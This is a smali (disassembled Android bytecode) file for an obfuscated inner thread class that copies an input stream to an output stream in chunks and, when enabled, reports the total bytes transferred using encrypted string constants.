.class public Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ$げつ〴ぬぐ$げつ〴ぬぐ;
.super Ljava/lang/Thread;
.source ""


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ$げつ〴ぬぐ;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "\u3052\u3064\u3034\u306c\u3050"
.end annotation


# instance fields
.field public 〺つふすそ:Ljava/io/InputStream;

.field public くし〴〺ぅ:Ljava/io/OutputStream;

.field public づざかべべ:Z

.field public びぐびあび:[B


# direct methods
.method public constructor <init>(Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ$げつ〴ぬぐ;Ljava/io/InputStream;Ljava/io/OutputStream;Z)V
    .registers 5

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    const/16 p1, 0x1000

    new-array p1, p1, [B

    iput-object p1, p0, Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ$げつ〴ぬぐ$げつ〴ぬぐ;->びぐびあび:[B

    iput-object p2, p0, Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ$げつ〴ぬぐ$げつ〴ぬぐ;->〺つふすそ:Ljava/io/InputStream;

    iput-object p3, p0, Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ$げつ〴ぬぐ$げつ〴ぬぐ;->くし〴〺ぅ:Ljava/io/OutputStream;

    iput-boolean p4, p0, Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ$げつ〴ぬぐ$げつ〴ぬぐ;->づざかべべ:Z

    return-void
.end method


# virtual methods
.method public run()V
    .registers 7

    const-wide/16 v0, 0x0

    :cond_2
    :goto_2
    :try_start_2
    iget-object v2, p0, Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ$げつ〴ぬぐ$げつ〴ぬぐ;->〺つふすそ:Ljava/io/InputStream;

    iget-object v3, p0, Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ$げつ〴ぬぐ$げつ〴ぬぐ;->びぐびあび:[B

    invoke-virtual {v2, v3}, Ljava/io/InputStream;->read([B)I

    move-result v2

    const/4 v3, -0x1

    if-ne v2, v3, :cond_41

    iget-boolean v2, p0, Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ$げつ〴ぬぐ$げつ〴ぬぐ;->づざかべべ:Z

    if-eqz v2, :cond_53

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\u001cehOf=A4;Jk<K7n\u001agi\u001c`mM4hMgg\u001dbn\u00197;\u001d0=@khJc:Ag9\u001a4hK0lL4:L4kL`gHem\u0019"

    invoke-static {v3}, Lxyz/easypro/ecrypt/utils/Crypt;->xrc(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lxyz/easypro/ecrypt/utils/Crypt;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-instance v3, Ljava/util/Locale;

    const-string v4, "\u001ej<\u001ebmJegI4:I4>Hc>\u0019j9Jd:K1g@d:J3"

    invoke-static {v4}, Lxyz/easypro/ecrypt/utils/Crypt;->xrc(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lxyz/easypro/ecrypt/utils/Crypt;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/util/Locale;-><init>(Ljava/lang/String;)V

    invoke-static {v0, v1, v3}, Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/ぇぬぎばつ/なぎぱいぢぎ;->〺つふすそ(JLjava/util/Locale;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ;->げつ〴ぬぐ(Ljava/lang/String;)V

    goto :goto_53

    :cond_41
    if-lez v2, :cond_2

    iget-object v3, p0, Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ$げつ〴ぬぐ$げつ〴ぬぐ;->くし〴〺ぅ:Ljava/io/OutputStream;

    iget-object v4, p0, Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ$げつ〴ぬぐ$げつ〴ぬぐ;->びぐびあび:[B

    const/4 v5, 0x0

    invoke-virtual {v3, v4, v5, v2}, Ljava/io/OutputStream;->write([BII)V

    iget-object v3, p0, Lてぜきぽく/げつ〴ぬぐ/げつ〴ぬぐ/げつ〴ぬぐ/へぬ〴づぞ/ぺぁあねじ/げつ〴ぬぐ$げつ〴ぬぐ$げつ〴ぬぐ;->くし〴〺ぅ:Ljava/io/OutputStream;

    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V
    :try_end_50
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_50} :catch_53

    int-to-long v2, v2

    add-long/2addr v0, v2

    goto :goto_2

    :catch_53
    :cond_53
    :goto_53
    return-void
.end method
